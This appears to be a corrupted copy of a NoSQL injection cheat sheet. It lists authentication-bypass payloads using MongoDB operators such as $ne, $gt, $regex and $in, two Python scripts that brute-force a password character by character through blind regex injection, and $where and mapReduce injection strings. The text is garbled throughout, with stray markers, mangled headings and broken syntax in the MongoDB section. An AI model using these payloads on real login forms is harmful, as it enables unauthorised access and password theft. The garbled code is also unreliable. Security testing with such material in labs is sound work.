没有搜索-查询有效载荷！？
> NoSQL databases provide looser consistency restrictions than traditional SQL databases. 
> By requiring fewer relational constraints and consistency checks.
> NoSQL databases offer performance and scaling benefits. 
> These databases are still potentially vulnerable to injection attacks...
> if Summary * [Tools](#tools)
* [Exploit](#exploits)
  * [Authentication Bypass](#authentication-bypass)
  * [Extract length information](#extract-length-information)
  * [Extract data information](#extract-data-information)
* [Blind NoSQL](#blind-nosql)
  * [POST with JSON body](#post-with-json-body)
  * [GET](#get)
* [MongoDB Payloads](#mongodb-payloads)
* [References](#references)
 Tools
* [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)
* [nosqlilab - A lab for playing with NoSQL Injection](https://github.com/digininja/nosqlilab)
 Xploit 0Auth || 0Auth not equal ($ne) or greater ($gt);
>>>import json in .dat
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
<>
in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
 Extract length-info
in JSON
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
 Extract info.dat
in json
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp
username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*
in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
Extract .dat with "in" for
 in json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
$Blind__NoSQL
 [POST] with [JSON] 
  _body_
>>>import requests
>>>import urllib3
>>>import string
>>>import urllib
urllib3.disable_warnings()
<>
username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}
<>
while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
# GET
~
>>>import requests
>>>import urllib3
>>>import string
>>>import urllib
urllib3.disable_warnings()
<>
username='admin'
password=''
u='http://example.org/login'
<>
while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print("Found one more char : %s" % (password+c))
        password += c
<>
# MongoDB Payloads
  true 
$where: '1 == 1'
$where: '1 == 1'
$where: '1 == 1'<br> 
$where: '1 == 1'1<br> 
$where: '1 == 1'
  { 
   $ne: 1 
  };<br> 
$or: [{void};
      { 
       'a':'a' 
      }; 
    ];<br> 
       $comment:'S U C C E S S !'
$db.injection.insert({success:1});
$db.injection.insert({success:1});
 return
 1;$db.stores.mapReduce(function(string) 
                        { 
                         { emit(1,1||1==1'&&this.password.match(/.*/)//+%00'&&'this.passwordzz.match(/.*/)//+%00'%20%26%26%20this.password.match(/.*/)//+%00'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: 'NUL'};
[$ne]=1
* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
* [Testing for NoSQL injection - OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)
* [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
* [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
                                {void};
                                }}]]
